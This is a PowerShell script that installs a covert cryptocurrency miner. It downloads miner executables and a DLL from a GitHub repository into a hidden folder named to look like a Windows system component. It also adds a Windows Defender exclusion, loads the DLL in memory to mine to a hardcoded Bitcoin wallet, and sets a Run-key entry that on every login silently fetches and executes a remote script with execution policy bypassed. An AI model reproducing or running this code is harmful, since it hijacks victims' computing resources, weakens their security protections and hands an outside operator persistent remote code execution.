$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$CpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_x.exe"
$GpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_g.exe"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"

$StealthDir = "$env:LOCALAPPDATA\WinSys"

Write-Host "[1/5] Initializing network protocols..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::CheckCertificateRevocationList = $false

function Get-StealthFile($Url, $Path) {
    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
    } catch { }
    try {
        if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
            curl.exe -L -k --ssl-no-revoke -o $Path $Url
            if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
        }
    } catch { }
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($Url, $Path)
        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
    } catch { }
    return $false
}

Write-Host "[2/5] Preparing stealth directory & clearing locks..." -ForegroundColor Cyan
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
} else {
    Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
}

Write-Host "[3/5] Configuring security exclusions..." -ForegroundColor Cyan
try {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
    }
} catch { }

$CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
$GpuExe = Join-Path $StealthDir "WinSystem_g.exe"

Write-Host "[4/5] Deploying Turbo CPU and GPU engines..." -ForegroundColor Cyan
# CPU Download
if (-not (Test-Path $CpuExe)) {
    Get-StealthFile $CpuUrl $CpuExe | Out-Null
}

# GPU Check and Download
$GpuDetected = $null
try {
    $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    if ($vc) {
        $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
    }
} catch { }

if ($GpuDetected -and -not (Test-Path $GpuExe)) {
    Get-StealthFile $GpuUrl $GpuExe | Out-Null
}

Write-Host "[5/5] Finalizing loader & persistence..." -ForegroundColor Cyan
try {
    $DllPath = Join-Path $StealthDir "Bridge.dll"
    if (Get-StealthFile $DllUrl $DllPath) {
        if ((Get-Item $DllPath).Length -gt 1000) {
            $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
            $assembly = [System.Reflection.Assembly]::Load($dllBytes)
            $loader = $assembly.GetType("DateFundLoader")
            $startMethod = $loader.GetMethod("StartMiner")
            
            $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
            $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
            
            $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $Name = "WinSys"
            $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[Net.ServicePointManager]::CheckCertificateRevocationList = `$false; iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
            Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
            
            Write-Host "`nTURBO DEPLOYMENT SUCCESSFUL - Hashing active." -ForegroundColor Green
        }
    }
} catch {
    Write-Host "`nDEPLOYMENT FAILED: $($_.Exception.Message)" -ForegroundColor Red
}
